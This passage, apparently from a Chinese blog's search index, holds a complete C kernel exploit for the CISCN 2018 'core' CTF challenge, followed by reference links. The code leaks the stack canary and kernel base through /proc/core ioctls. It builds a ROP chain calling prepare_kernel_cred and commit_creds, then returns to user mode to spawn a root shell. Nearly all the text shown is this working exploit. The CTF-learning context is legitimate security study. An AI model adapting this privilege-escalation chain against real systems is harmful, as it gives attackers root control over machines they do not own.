class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;fcntl.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">#include&lt;sys/wait.h&gt;</span><br><span class="line">#include&lt;sys/ioctl.h&gt;</span><br><span class="line">#include&lt;pthread.h&gt;</span><br><span class="line">void setoff(int fd,long long size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889c,size);</span><br><span class="line">&#125;</span><br><span class="line">void core_read(int fd,char *buf)&#123;</span><br><span class="line">    ioctl(fd,0x6677889b,buf);</span><br><span class="line">&#125;</span><br><span class="line">void core_copy_func(int fd,long long size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889a,size);</span><br><span class="line">&#125;</span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line">void save_status(void)</span><br><span class="line">&#123;</span><br><span class="line">    asm volatile (</span><br><span class="line">        &quot;mov user_cs, cs;&quot;</span><br><span class="line">        &quot;mov user_ss, ss;&quot;</span><br><span class="line">        &quot;mov user_sp, rsp;&quot;</span><br><span class="line">        &quot;pushf;&quot;</span><br><span class="line">        &quot;pop user_rflags;&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_shell()&#123;</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int fd ;</span><br><span class="line">    size_t tmp;</span><br><span class="line">    char buf[0x50];</span><br><span class="line">    size_t rop[0x100];</span><br><span class="line">    size_t vmlinux_base,canary,core_base;</span><br><span class="line">    size_t commit_creds = 0x9c8e0;</span><br><span class="line">    size_t prepare_kernel_cred = 0x9cce0;</span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(&quot;/proc/core&quot;,O_RDWR); //程序创造了一个接口，所以我们需要把这个接口给打开 ，这样才能进行函数调用</span><br><span class="line">    if(fd &lt; 0) &#123;</span><br><span class="line">        printf(&quot;Open /proc/core error!\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    setoff(fd,0x40); // v4 距离 canary 的偏移是 0x40 ，而且v5的数据类型是char类型。</span><br><span class="line">    core_read(fd,buf); //把canary读入用户态的buf </span><br><span class="line">    size_t pop_rdi = 0x000b2f;</span><br><span class="line">    size_t push_rax = 0x02d112;</span><br><span class="line">    size_t swapgs = 0x0d6;</span><br><span class="line">    size_t iretq ;</span><br><span class="line">    size_t xchg = 0x16684f0;</span><br><span class="line">    size_t call_rax = 0x40398;</span><br><span class="line">    size_t pop_rcx = 0x21e53;</span><br><span class="line">    size_t pop_rbp = 0x3c4;</span><br><span class="line">    size_t pop_rdx = 0xa0f49;</span><br><span class="line">    size_t mov_rdi_rax_call_rdx = 0x01aa6a;</span><br><span class="line">    //此时buf的前八个字节是我们的canary</span><br><span class="line">    canary = (*(size_t *)(&amp;buf[0]));</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] Canary  &gt;&gt; %p.\033[0m\n&quot;,canary);</span><br><span class="line">    core_base = (*(size_t *)(&amp;buf[2*8])) - 0x19b;</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] core_base  &gt;&gt; %p.\033[0m\n&quot;,core_base);</span><br><span class="line">    vmlinux_base = (*(size_t *)(&amp;buf[4*8]) - 0x1dd6d1);</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] vmlinux_base  &gt;&gt; %p.\033[0m\n&quot;,vmlinux_base);</span><br><span class="line">    pop_rdi += vmlinux_base;</span><br><span class="line">    pop_rcx += vmlinux_base;</span><br><span class="line">    pop_rbp += vmlinux_base;</span><br><span class="line">    pop_rdx += vmlinux_base;</span><br><span class="line">    mov_rdi_rax_call_rdx += vmlinux_base;</span><br><span class="line">    swapgs += core_base;</span><br><span class="line">    iretq = 0x50ac2 + vmlinux_base;</span><br><span class="line">    commit_creds += vmlinux_base;</span><br><span class="line">    prepare_kernel_cred += vmlinux_base;</span><br><span class="line">    int i = 0;</span><br><span class="line">    for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    i = 10;</span><br><span class="line">    rop[i++] = pop_rdi; </span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;</span><br><span class="line">    rop[i++] = pop_rdx;</span><br><span class="line">    rop[i++] = pop_rcx;</span><br><span class="line">    rop[i++] = mov_rdi_rax_call_rdx;</span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line">    rop[i++] = swapgs; //恢复用户GS寄存器</span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = iretq;</span><br><span class="line">    rop[i++] = (size_t)get_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,i*8);</span><br><span class="line">    core_copy_func(fd,0xf000000000000000+i*8);</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Attack Success! .\033[0m&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/rop/">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/rop/</a></p><p><a href="https://ret2p4nda.github.io/2018/07/13/ciscn2018-core/">https://ret2p4nda.github.io/2018/07/13/ciscn2018-core/</a></p><p><a href="https://www.z1r0.top/2021/10/22/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B">https://www.z1r0.top/2021/10/22/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel Pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
